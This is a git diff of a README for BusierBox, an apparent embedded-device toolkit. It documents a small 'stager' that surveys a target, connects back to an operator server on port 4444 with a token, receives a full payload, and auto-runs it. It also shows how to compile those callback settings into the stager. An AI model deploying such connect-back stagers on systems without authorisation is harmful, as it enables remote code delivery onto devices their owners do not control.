@@ -62,7 +62,7 @@ runtime/payload/bin/     BusyBox and future tool binaries
 runtime/payload/lib/     bundled shared libraries when static builds are unavailable
 runtime/payload/home/    payload HOME
 dist/busierbox-<target>-full    self-extracting target-specific artifact
-dist/busierbox-<target>-stager  small bootstrap/fetch-full artifact
+dist/busierbox-<target>-stager  small callback/upload bootstrap artifact
 dist/internal/                  internal payload-less cores when enabled
 dist/busierbox                  native convenience alias, when native is packaged
 dist/payload-<target>.*  optional payload archives/debug artifacts
@@ -118,7 +118,7 @@ dist/busierbox-mipsel-linux-4.x-musl-full
 dist/busierbox-mipsel-linux-4.x-musl-stager
 ```
 
-`-full` is the feature-complete self-extracting artifact. It contains a BusierBox core built for that target plus a payload archive built for that same target. `-stager` is intentionally small and identifies itself as a stager; it does not advertise payload tools and provides `fetch-full` to download a full artifact with target `wget` or `curl`. A compatibility copy without the `-full` suffix is still written for existing scripts. Internal payload-less cores are written only under `dist/internal/` when enabled and should not be deployed as normal artifacts.
+`-full` is the feature-complete self-extracting artifact. It contains a BusierBox core built for that target plus a payload archive built for that same target. `-stager` is a separate small target-specific binary with no embedded payload; it surveys the target, connects back to an operator server, receives a full artifact over the same TCP connection, verifies SHA-256, chmods it, and can run `doctor` or `survey`. A compatibility copy without the `-full` suffix is still written for existing scripts. Internal payload-less cores are written only under `dist/internal/` when enabled and should not be deployed as normal artifacts.
 
 Artifact output knobs:
 
@@ -128,21 +128,37 @@ BB_BUILD_STAGER="yes"
 BB_BUILD_INTERNAL_CORE="no"
 ```
 
-Stager fetch example:
+Three-layer stager/server/full flow:
 
 ```sh
-./busierbox-mipsel-linux-4.x-musl-stager fetch-full http://host/busierbox-mipsel-linux-4.x-musl-full ./busierbox-full --sha256 <hash>
-./busierbox-full doctor
+scripts/busierbox-server --listen 0.0.0.0:4444 \
+  --token testtoken \
+  --artifact dist/busierbox-mipsel-linux-4.x-musl-full \
+  --send --exec-doctor --once
+
+./busierbox-mipsel-linux-4.x-musl-stager \
+  --callback-host 192.168.8.241 \
+  --callback-port 4444 \
+  --token testtoken
 ```
 
-Callback/connect-back configuration is explicit, visible in `doctor` and `config-info`, and non-persistent by default:
+The server prints candidate callback addresses using `scripts/list-local-ips`, validates the shared token, displays the stager survey, sends the configured full artifact, and logs sessions under `.busierbox-server/sessions/`.
+
+Callback defaults can also be compiled directly into the stager. With these values set, running the stager with no arguments attempts the callback once per configured retry policy:
 
 ```sh
-BB_STAGER_CALLBACK_ENABLE="no"
-BB_STAGER_CALLBACK_HOST=""
-BB_STAGER_CALLBACK_PORT=""
-BB_STAGER_CALLBACK_SHELL="sh"
+BB_STAGER_CALLBACK_ENABLE="yes"
+BB_STAGER_CALLBACK_HOST="192.168.8.241"
+BB_STAGER_CALLBACK_PORT="4444"
+BB_STAGER_TOKEN="testtoken"
+BB_STAGER_CONNECT_TIMEOUT="10"
+BB_STAGER_RETRY_COUNT="3"
+BB_STAGER_RETRY_DELAY="2"
+BB_STAGER_OUTPUT_PATH="/tmp/busierbox-full"
+BB_STAGER_AUTO_EXEC="doctor"
 ```
+
+The stager is not universal: it must be built for the target architecture. Callback behavior is explicit and operator-controlled; BusierBox does not install persistence, daemonize, hide processes, delete logs, or beacon in the background.
 
 Convenience commands:
 
@@ -150,6 +166,8 @@ Convenience commands:
 make package-native
 make package TARGET=native
 make package TARGET=glinet-mt7621-openwrt-musl
+make package-full TARGET=mipsel-linux-4.x-musl
+make package-stager TARGET=mipsel-linux-4.x-musl
 make package-all-presets
 ```
 
